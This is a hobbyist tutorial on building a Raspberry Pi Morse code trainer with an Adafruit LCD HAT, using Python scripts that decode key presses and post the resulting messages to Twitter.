for a full display, we've selected a bright, crisp and slightly-retro LCD screen from Adafruit. These popular panels normally require a lot of GPIO pins to be driven natively, but this HAT uses an input extender so that only two pins are needed. Better yet, it comes with five tactile switches on-board so we can use them for input.    This LCD kit arrives unassembled, so it's time to get the soldering iron out. There are excellent assembly instructions. As always, read through them before doing anything and take your time.    Set up the display  Once your display is assembled, you can attach it to your Raspberry Pi (make sure the latter is switched off!). Due to the close proximity of some of the resistors, cover the top of the USB ports and Ethernet port with insulation tape if they are close to the PCB of the display.    Test the display is working by installing its Python libraries:    sudo pip3 install adafruit-circuitpython-charlcd  Now create a new file called lcd.py and enter the code from the listing here. Save it and run it using python3 lcd.py. The display should show your message. If it lights up but you can't see anything, adjust the 'Contrast' potentiometer until the text appears.    Version 2  It's time for a more advanced version of our original code, so download lcd_morse.py from GitHub. This time we're reading input from the LCD's on-board tactile keys, so the code needs to be a bit different. The time measurement variables are still there. Run it using python3 lcd_morse.py.    You should be able to key away and see the interpreted letters appear on screen. You now have a functioning standalone Morse code trainer.    Let's tweet  We'd like to be able to send our messages to Twitter. For security reasons, we need to create a Twitter 'application' which gives the code unique credentials for posting on our behalf. We're using the python-twitter library - see the docs for an excellent tutorial on how to set it up. You will be given four strings: a consumer key, consumer secret, access token, and access token secret. Enter all the values in the equivalent variables in the first few lines of lcd_morse_twitter.py (download the code from GitHub). Now save the file.    Tweet with Morse!  Run python3 lcd_morse_twitter.py. As before, you can construct your message by tapping on the right-hand cursor button of the LCD display. Your message will be displayed at the top, and the current dots and dashes in the 'buffer' at the bottom. Made a mistake? No problem: click the left-hand cursor to delete the previous character or the 'up' key to delete the entire message and start again. When you're happy, click on 'Select' to send. Your message will be posted to your account for all of Twitter to read.    Add a Morse key  Let's take the authenticity up a notch by adding a real Morse key. These keys are nothing more than a simple on/off switch. That said, some can be surprisingly expensive as they are built using precision components to allow the operator to go faster and faster with fewer mistakes. We've selected a more affordable training key that has two contacts that can be directly connected. To use the existing code, solder two wires to the underneath of the rightmost tactile switch on the LCD board and connect them to the key using its screw terminals. Now you can key away using the real thing!  Going further  Now you have the basics as Python code, you can repurpose your tweeting Morse key for anything you can imagine. Add a second key and create Morse code challenge games. How about Morse code hangman? Add timing in to see how many letters per minute you can key. Could two identical setups send messages to each other?    Although initially challenging, learning Morse code is rewarding and can inspire operators to go on to the rich and fascinating world of amateur radio. Over to you.
